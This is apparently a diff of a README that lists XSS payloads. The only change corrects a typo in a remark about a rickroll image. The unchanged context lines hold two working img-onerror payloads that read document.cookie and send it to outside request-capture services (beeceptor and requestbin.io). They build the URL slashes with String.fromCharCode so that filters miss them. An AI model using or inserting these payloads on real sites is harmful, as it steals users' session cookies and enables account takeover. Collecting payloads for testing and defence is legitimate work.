@@ -8,7 +8,7 @@ Payloads :
 - ``<img src=y onerror=window.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'<endpoint>.free.beeceptor.com?a='+document.cookie>.txt``
 - ``<img src=y onerror=(document.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'requestbin.io'+String.fromCharCode(47)+'<endpoint>?'+document.cookie)>``
 
-Little trool : you got rickrolled when you are using a source with the image "x".
+Little troll : you got rickrolled when you are using a source with the image "x".
 
 ## Français
 
